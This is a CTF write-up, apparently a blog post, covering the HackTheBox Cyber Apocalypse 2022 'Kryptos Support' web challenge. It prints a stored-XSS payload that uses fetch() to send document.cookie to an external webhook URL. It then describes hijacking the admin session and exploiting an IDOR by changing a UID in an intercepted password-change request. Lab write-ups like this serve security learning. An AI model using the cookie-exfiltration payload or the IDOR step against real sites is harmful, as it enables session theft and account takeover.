---
title: "Cyber Apocalypse 2022 - Kryptos Support"
date: 2022-05-15T22:15:58+09:00
description: "A Web Challenge from HackTheBox's Cyber Apocalypse 2022"
tags: [XSS,IDOR,WEB,Burpsuite,CTF,CyberApocalypse 2022]
categories: [CTF,Ethical Hacking,Pentesting]
comments: false
draft: false
---
I'll have to admit. This being the first challenge in the web category for the Cyber Apocalypse CTF from HackTheBox definitely set the tone of what to expect. This challenge was an XSS and IDOR combination. Do your directory enumeration in the background. Let's see how it broke down.

### XSS

When navigating to the website you will notice this flash-like website bringing me back to memories of the early 2000's. 

{{<figure src="/images/Posts/016/Kryptos.jpg">}}

There is an input field!!! What can we do? Well trying the default XSS to do a popup ```<script>"XSS"</script>``` returned nothing. You can notice there is a backend button on the top left. Once you navigate there, you will be greeted with a login page. 

{{<figure src="/images/Posts/016/login.jpg">}}

Alright, if there is login then what are you options? You can try running Burpsuite to run a password attack with a password list. Yes, Yes you can. I don't know how happy HackTheBox would be with running the password attack, but after about 30 minutes of using the community edition of Burpsuite with no results you will look for other options. Did you know you can steal cookies using XSS? Well come to find out it is considerably faster than Burpsuite community edition. I have never done this before, so off to the best hacking tool ever invented...Google. I found two great walkthroughs from [Infinite Logins](https://infinitelogins.com/2020/10/13/using-cross-site-scripting-xss-to-steal-cookies/) and from [Portswigger](https://infinitelogins.com/2020/10/13/using-cross-site-scripting-xss-to-steal-cookies/) to get this going. 

Following the Portswigger community solutions video you can notice the XSS script we will be using.

```javascript
<script>
fetch('https://your_web_hook_url/', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

The fetch function of the walkthrough on Portswiggers community solution stumped me. They use Burpsuite's collaborator tool which is locked behind Burpsuite Pro. That is where Infinite Logins' walkthrough saves the day. You can set up a [webhook](https://webhook.link). This will give us the cookie we will need. 

{{<figure src="/images/Posts/016/webhook_addy.jpg">}}

We will put this into the script above and full send this.

```javascript
<script>
fetch('https://webhook.link/5f41db1a-e3c8-4906-aaac-89f67978ba91', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

Once you see the message "AN ADMIN WILL REVIEW YOUR TICKET SHORTLY!" the payload has been sent.

{{<figure src="/images/Posts/016/xss_send.jpg">}}

Now we need to grab our cookie data and make a cookie to log authenticate with.

{{<figure src="/images/Posts/016/cookie.jpg">}}

Navigate back to the login page and open your browsers development tools to put the cookie information in,and refresh the page. The directory enumeration revealed a directory ```/tickets/```. Navigate to that directory and you will see some tickets waiting for you.

{{<figure src="/images/Posts/016/tickets.jpg">}}

What you are really after is the settings button on the top left hand corner. This will give you a change password prompt. Awesome!!

### IDOR

Fire up burpsuite and make sure intercept is on. We want to control what password we are changing. Enter the new password and hit update. 

{{<figure src="/images/Posts/016/password.jpg">}}

We will check burp and make sure it intercepted it to change it.

{{<figure src="/images/Posts/016/burpidor.jpg">}}

The UID we will change from 100 to 1. This will be the admin password we are changing. We can confirm we changed the admin password on the login page it will say that we changed admin's password. 

To finish this off log out and login as admin with your brand new complicated password to get the flag


---
{{< youtube g9-Zta5OO_0 >}}
---
{{< youtube UXtxfka2TuY >}}